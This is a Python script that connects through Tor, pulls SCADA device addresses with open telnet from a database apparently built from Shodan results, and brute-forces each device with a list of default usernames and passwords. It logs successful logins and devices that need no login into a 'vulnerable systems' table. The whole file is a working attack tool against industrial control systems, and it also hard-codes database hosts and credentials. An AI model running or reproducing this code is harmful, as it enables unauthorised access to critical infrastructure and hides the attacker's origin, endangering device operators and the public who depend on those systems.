#!/user/bin/python

import socket
import socks
import telnetlib
import pymysql
import urllib
import json
import re

db_10 = pymysql.connect(host="10.128.50.165",  # your host, usually localhost
                        port=8080,
                        user="shodan",  # your username
                        passwd="Sh0d@n7e",  # your password
                        db="test",
                        charset='utf8',
                        autocommit=True)  # name of the data base

db_128 = pymysql.connect(host="128.196.27.147",  # your host, usually localhost
                         user="ShodanTeam",  # your username
                         passwd="Sh0d@n7e",  # your password
                         db="passworddb",
                         charset='utf8',
                         autocommit=True)  # name of the data base


def connectTor():
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9150, True)
    socket.socket = socks.socksocket

    data = json.loads(urllib.urlopen("http://ip-api.com/json").read())
    print('Testing data using IP: ' + data["query"])

    cursor_10 = db_10.cursor()
    cursor_10_insert = db_10.cursor()
    cursor_128 = db_128.cursor()

    try:
        sql = "SELECT * FROM test.shodan_classified_scada  \
               WHERE port = 23 and id > 13000"

        # % (keyword, keyword, keyword, keyword, keyword)
        try:
            # Execute the SQL command
            cursor_10.execute(sql)
            # Commit your changes in the database
            results_10 = cursor_10.fetchall()

            if results_10 == ():
                print('null')
                passID = 0
            else:
                for row in results_10:
                    ip_id = row[0]
                    ip = row[1]
                    # Now print fetched result
                    print("IP =%s" % ip)
                    # requests.session(headers=headers, hooks=hooks, verify=False)
                    ipaddr = ip
                    # print('connected to device, no login')

                    sql = "SELECT * FROM passworddb.scadapasswords"
                    # Execute the SQL command
                    cursor_128.execute(sql)
                    # Commit your changes in the database
                    results_128 = cursor_128.fetchall()

                    try:
                        for row_128 in results_128:
                            passID = row_128[0]
                            UserName = row_128[9]
                            Password = row_128[10]
                            # Now print fetched result

                            HOST = ip
                            user = UserName.encode('ascii', 'ignore')
                            password = Password.encode('ascii', 'ignore')

                            tn = telnetlib.Telnet(HOST, '', 4)
                            print("tel success")

                            try:
                                line = tn.read_until("A$tring+hatWouldN0tExist", 3)

                                strline = str(line)
                                strline = strline.replace('\'', '')
                                line = strline.lower()
                                # print line
                                if ("login" in line) or ("user" in line) or ("password" in line) or \
                                        ("closing connection" in line):
                                    try:
                                        print(passID)
                                        try:
                                            tn.write(user + "\n")
                                            print("user success")
                                        except Exception as e:
                                            print("fail user write %s" % e)
                                            tn.close()
                                        if password:
                                            # reg = re.compile("password", re.I)
                                            # print tn.expect(reg)
                                            tn.read_until("assword: ", 3)
                                            try:
                                                tn.write(password + "\n")
                                                print("pass success")
                                            except:
                                                print("pass failure")
                                                tn.close()
                                        try:
                                            line2 = tn.read_until("A$tring+hatWouldN0tExist", 5)

                                            strline = str(line2)
                                            strline = strline.replace('\'', '')
                                            line2 = strline.lower()
                                            if not (("user" in line2) or ("login" in line2) or
                                                        ("password" in line2) or ("fail" in line2) or
                                                        ("reject" in line2)):
                                                print(line2)
                                                try:
                                                    # print passID
                                                    sql = "INSERT INTO vulnerablesystems_new(ip_id, ipaddr, passwordid, notes, openport) \
                                                               VALUES ('%s', '%s', '%s', '%s', '%s')" % (
                                                        ip_id, ipaddr, passID, line, '')
                                                    tn.close()
                                                except:
                                                    print('error on SQL insert')
                                                    tn.close()
                                                try:
                                                    # Execute the SQL command
                                                    cursor_10_insert.execute(sql)
                                                    # Commit your changes in the database
                                                    db_10.commit()
                                                    print("successfully inserted a default pass")
                                                except Exception as e:
                                                    print('Error: %s' % e)
                                                    # Rollback in case there is any error
                                                    db_10.rollback()
                                                    print("Error inserting Data: rolledback")
                                                    tn.close()
                                                # print "ilon success!"
                                                # print line
                                                tn.close()
                                            else:
                                                print("A strange error occurred")
                                                tn.close()

                                        except:
                                            print("error on connecting")
                                            tn.close()

                                    except:
                                        print('error on info retrieve')
                                        tn.close()

                                    tn.close()
                                elif ("refuse" in line) or ("reject" in line):
                                    print("connection refused")
                                    tn.close()
                                else:
                                    print("No known login needed")
                                    print(line)
                                    try:
                                        # print passID
                                        sql = "INSERT INTO vulnerablesystems_new(ip_id, ipaddr, passwordid, notes, openport) \
                                                   VALUES ('%s', '%s', '%s', '%s', '%s')" % (
                                            ip_id, ipaddr, '5002', line, 'no login needed')
                                        tn.close()
                                    except:
                                        print('error on SQL insert')
                                        tn.close()
                                    try:
                                        # Execute the SQL command
                                        cursor_10.execute(sql)
                                        # Commit your changes in the database
                                        db_10.commit()
                                        print("successfully inserted a default pass")
                                    except Exception as e:
                                        print('Error: %s' % e)
                                        # Rollback in case there is any error
                                        db_10.rollback()
                                        print("Error inserting Data: rolledback")
                                        tn.close()
                                    tn.close()

                                print(tn.read_all())
                            except:
                                print("Telnet Server Not Available")
                                tn.close()


                    except Exception as e:
                        print('server timeout: %s' % e)

        except Exception as e:
            print('Error: %s' % e)

    except Exception as e:
        print ('Error: %s' % e)
        db_10.close()
        db_128.close()


connectTor()
